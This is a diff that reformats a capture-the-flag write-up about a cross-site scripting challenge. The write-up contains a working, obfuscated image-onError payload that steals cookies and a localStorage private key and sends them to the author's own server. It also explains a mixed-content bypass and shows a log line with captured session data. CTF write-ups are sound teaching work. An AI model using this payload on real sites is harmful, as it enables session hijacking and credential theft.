@@ -61,12 +61,18 @@ So it was obvious you had to CSRF the admins browser and steal localStorage keys
 I continued with creating a user with this payload:
 <img src=asd onError='(function(){a=document.cookie;b=localStorage.getItem(String.fromCharCode(112,114,105,118,97,116,101,75,101,121));var bajs = document.createElement(String.fromCharCode(105,109,103));document.body.appendChild(bajs);bajs.src=String.fromCharCode(encoded_ip_removed)+a+b;}())'>
 
-What this does is dynamically create an image pointing to my own server that has the localStorage.getItem("privateKey") and document.cookie in its src. String.fromCharCode wasn't really necesarry but I started using it for and just went with it, #yolo. The challenge server was listening on HTTPs and if you are XSS'ing and pointing some resources to a HTTP server it blocks loading because of Mixed-content warnings but this can be bypased creating a image to the "drop-server" with the appended payload! (Images are allowed to load over http on https enabled sites)
+What this does is dynamically create an image pointing to my own server that has the localStorage.getItem("privateKey") and document.cookie in its src.
+String.fromCharCode wasn't really necesarry but I started using it for and just went with it, #yolo.
+The challenge server was listening on HTTPs and if you are XSS'ing and pointing resources to a HTTP server it blocks loading because of Mixed-content warnings,
+but this can be bypased creating a image to the "drop-server" with the appended payload! (Images are allowed to load over http on https enabled sites)
 
 And we get:
 52.214.142.175 - - [22/Jan/2017:17:27:36 +0100] "GET /PHPSESSID=s4gm53rltv44r9ui4i2alk5pa2%7B%22alg%22:%22RSA-OAEP-256%22,%22d%22:%22C ... {snip}
 
-I got stuck here thinking that localStorage was "renewed" every time I created a user and what i retrieved was my newly created users localStorage. Since the XSS was in user-signup I tried different strategies in retrieving sessid and the admins localStorage keys. When the CTF was over I read different writeups and I realized this was not the case, and the flag was in localStorage.getItem('flag')... So yeah.. big fail from my part but I learned my lesson :p.
+I got stuck here thinking that localStorage was "renewed" every time I created a user and what i retrieved was my newly created users localStorage.
+Since the XSS was in user-signup I tried different strategies in retrieving sessid and the admins localStorage keys.
+When the CTF was over I read different writeups and I realized this was not the case, and the flag was in localStorage.getItem('flag')...
+So yeah.. big fail from my part but I learned my lesson :p.
 
 Lesson learned:
 Study the javascript source more
